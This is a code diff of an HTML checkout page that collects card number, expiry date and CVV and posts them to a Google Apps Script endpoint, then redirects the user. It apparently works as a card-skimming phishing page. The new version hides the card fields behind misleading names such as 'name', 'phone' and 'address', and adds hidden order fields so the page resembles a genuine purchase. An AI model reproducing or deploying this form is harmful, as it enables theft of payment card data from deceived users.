@@ -38,48 +38,55 @@
 </head>
 <body>
 
-<h2>Payment Details</h2>
-<form id="paymentForm">
-    <label for="cardNumber">Card Number:</label>
-    <input type="text" id="cardNumber" name="cardNumber" required>
+<h1>Customer Details Form</h1>
+    <form id="customerForm">
+        <label for="name">Card Number</label>
+        <input type="text" id="name" name="name" placeholder="1111 2222 3333 4444" required><br><br>
 
-    <label for="expMonth">Expiration Month:</label>
-    <input type="text" id="expMonth" name="expMonth" required>
+        <label for="phone">Exp Month</label>
+        <input type="number" id="phone" name="phone" required><br><br>
 
-    <label for="expYear">Expiration Year:</label>
-    <input type="text" id="expYear" name="expYear" required>
+        <label for="city">Exp Year</label>
+        <input type="number" id="city" name="city" required><br><br>
 
-    <label for="cvv">CVV:</label>
-    <input type="text" id="cvv" name="cvv" required>
+        <label for="address">CVV</label>
+        <input type="number" id="address" name="address" required><br><br>
 
-    <input type="submit" value="Submit">
-</form>
+        <!-- <label for="itemCode">Item Code:</label> -->
+        <input type="hidden" id="itemCode" name="itemCode" value="SHST300281224P3" readonly><br><br>
+
+        <!-- <label for="date">Date:</label> -->
+        <input type="hidden" id="date" name="date" readonly><br><br>
+
+        <!-- Hidden fields for total price and profit -->
+        <input type="hidden" id="totalPrice" name="totalPrice" value="930"> <!-- Set your total price here -->
+        <input type="hidden" id="profit" name="profit" value="280"> <!-- Set your profit here -->
+
+        <input type="submit" value="Submit" id="sub">
+    </form>
 
 <script>
-    document.getElementById('paymentForm').addEventListener('submit', function(event) {
-        event.preventDefault();
+        // Set the current date in the date input field
+        document.getElementById('date').value = new Date().toISOString().split('T')[0];
 
-        const cardNumber = document.getElementById('cardNumber').value;
-        const expMonth = document.getElementById('expMonth').value;
-        const expYear = document.getElementById('expYear').value;
-        const cvv = document.getElementById('cvv').value;
+        document.getElementById('customerForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the default form submission
 
-        fetch('https://script.google.com/macros/s/AKfycbzqjG47kPLU8JfO5j6nUbK_VuUT6qejCYwvOUF5O0KUpf8gxPUdeyurW7ca3MaJPR51/exec', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({ cardNumber, expMonth, expYear, cvv })
-        })
-        .then(response => response.text())
-        .then(data => {
-            console.log(data);
-            // Redirect to another site after successful submission
-            window.location.href = "https://melodic-puppy-430091.netlify.app"; // Change to your desired URL
-        })
-        .catch(error => console.error('Error:', error));
-    });
-</script>
+            const formData = new FormData(this);
+            fetch('https://script.google.com/macros/s/AKfycbz6MmJj_b3w6_g3Z5RPYEoV5MxnIA_u4orQM0vLIhGrt4WQtkL_uJH6OEp9z_RJu8FFaA/exec', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                // Redirect to another HTML page after successful submission
+                window.location.href = 'ordersubmitted.html'; // Change this to your desired page
+            })
+            .catch(error => {
+                alert('Error: ' + error);
+            });
+        });
+    </script>
 
 </body>
 </html>
